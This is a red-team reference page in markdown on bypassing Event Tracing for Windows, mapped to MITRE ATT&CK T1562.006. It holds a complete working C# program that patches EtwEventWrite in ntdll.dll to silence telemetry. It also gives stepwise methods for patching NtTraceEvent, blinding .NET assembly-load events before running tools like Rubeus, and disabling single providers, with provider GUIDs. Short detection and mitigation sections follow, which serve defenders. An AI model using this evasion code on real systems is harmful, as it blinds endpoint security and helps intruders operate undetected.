% Filename: 06-red-teaming/evasion/etw-bypass.md
% Display name: ETW Bypass
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1562.006 (Impair Defenses: Indicator Blocking)
% Authors: @TristanInSec

# ETW Bypass

## Overview

Event Tracing for Windows (ETW) is the kernel-level telemetry framework that feeds data to EDR products, Windows Defender, and security logging. ETW providers generate events for .NET assembly loading, process creation, network activity, file operations, and more. Many EDR detections rely on ETW — blinding it removes a major source of telemetry. ETW bypass is often combined with AMSI bypass as a pre-execution step.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1562.006 - Impair Defenses: Indicator Blocking

## Techniques

### How ETW Works

```text
ETW Architecture:
  Providers  →  generate events (e.g., Microsoft-Windows-DotNETRuntime)
  Sessions   →  collect events from providers
  Consumers  →  process events (EDR agents, Event Log, performance monitors)

Key ETW providers for security:
  Microsoft-Windows-DotNETRuntime        — .NET assembly loading (used by EDR)
  Microsoft-Windows-Threat-Intelligence  — kernel-level threat telemetry
  Microsoft-Antimalware-Scan-Interface   — AMSI scan results
  Microsoft-Windows-PowerShell           — PowerShell script execution
  Microsoft-Windows-Kernel-Process       — process creation/termination

Flow:
  1. A .NET assembly loads → DotNETRuntime provider fires an event
  2. EDR's ETW consumer sees: "Assembly loaded: Rubeus.exe"
  3. EDR flags or blocks the activity

Bypassing ETW prevents step 2 from ever seeing the event.
```

### Patch EtwEventWrite (ntdll.dll)

```csharp
// Patch EtwEventWrite in ntdll.dll to return immediately (ret = 0xC3)
// This prevents ALL ETW events from the current process

using System;
using System.Runtime.InteropServices;

class EtwBypass {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    static void Main() {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");

        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);

        // Patch: ret (0xC3) — function returns immediately, no event written
        Marshal.WriteByte(etwAddr, 0xC3);

        VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
    }
}
```

### PowerShell ETW Bypass

```powershell
# Note: Patching EtwEventWrite from PowerShell requires P/Invoke to call
# VirtualProtect and write to the ntdll.dll code section — this is not trivially
# achievable via pure reflection. The approach is to use Add-Type to compile a
# small C# helper inline, or to use the C# method shown above executed via
# execute-assembly from a C2 framework.

# The .NET-layer ETW provider (System.Diagnostics.Eventing.EventProvider) exposes
# an internal m_enabled field that controls whether the provider is active.
# Disabling it prevents the managed ETW wrapper from firing events, but does NOT
# suppress native EtwEventWrite calls made directly by the CLR host.
# This technique is therefore partial — it silences managed .NET ETW providers only.

# The complete EtwEventWrite patch requires the C# implementation above (see
# "Patch EtwEventWrite (ntdll.dll)") compiled and run as a .NET assembly.
```

### Patch NtTraceEvent (Deeper)

```text
NtTraceEvent is the syscall behind EtwEventWrite:
  EtwEventWrite (ntdll.dll, user mode)
    → NtTraceEvent (ntdll.dll → kernel)

Patching NtTraceEvent at the syscall stub level provides a deeper bypass
that survives hooks on EtwEventWrite itself.

Method:
1. Resolve NtTraceEvent in ntdll.dll
2. VirtualProtect to make it writable
3. Overwrite with: xor eax, eax; ret (return STATUS_SUCCESS)
4. Restore original protection

Note: Some EDR products hook at the kernel level via kernel callbacks
or minifilters — userland ETW patching does not affect those.
```

### .NET Assembly Load Blinding

```text
The Microsoft-Windows-DotNETRuntime ETW provider specifically logs:
  - Assembly loading (which assemblies, from where)
  - Method JIT compilation
  - Garbage collection events
  - Exception handling

EDR products use this to detect:
  - Rubeus.exe, Seatbelt.exe, SharpHound.exe loaded in memory
  - execute-assembly style attacks

Bypassing this specific provider (before loading offensive .NET tools):
  - Patch EtwEventWrite before calling Assembly.Load()
  - Use the Donut -b 3 flag (bypasses AMSI/WLDP/ETW automatically)
  - Some C2 frameworks patch ETW before execute-assembly
```

### Selective Provider Disabling

```text
Rather than patching EtwEventWrite globally (which kills ALL ETW),
selectively disable specific providers:

Method: Modify the provider's EnableCallback to ignore enable requests

1. Find the ETW registration for the target provider (GUID-based)
2. Patch the provider's registration handle to disable it
3. Only the targeted provider is silenced — others continue normally

This is stealthier but more complex. Tools like ETWInternals
can enumerate active providers and their registration handles.
```

## ETW Provider GUIDs

```text
Provider                                     GUID
───────────────────────────────────────────  ────────────────────────────────────────
Microsoft-Windows-DotNETRuntime              {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
Microsoft-Windows-Threat-Intelligence        {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
Microsoft-Antimalware-Scan-Interface         {2A576B87-09A7-520E-C21A-4942F0271D67}
Microsoft-Windows-PowerShell                 {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
Microsoft-Windows-Kernel-Process             {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
```

## Detection Methods

### Host-Based Detection

- EDR detecting VirtualProtect calls on ntdll.dll code sections
- Integrity monitoring of EtwEventWrite / NtTraceEvent function prologues
- Kernel-level ETW consumers (TI provider) still receive events even if userland ETW is patched
- Sudden drop in ETW events from a process (baseline comparison)

### Kernel-Level Monitoring

- Microsoft-Windows-Threat-Intelligence ETW provider runs in kernel — cannot be patched from user mode
- Kernel callbacks (PsSetCreateProcessNotifyRoutine, etc.) are independent of ETW

## Mitigation Strategies

- **Kernel-level telemetry** — use EDR with kernel drivers, not just userland ETW
- **Memory integrity checks** — detect patches to ntdll.dll functions
- **Protected Process Light (PPL)** — run security services as PPL to prevent tampering
- **Hypervisor-based security** — HVCI prevents kernel-level code modification

## References

### MITRE ATT&CK

- [T1562.006 - Impair Defenses: Indicator Blocking](https://attack.mitre.org/techniques/T1562/006/)
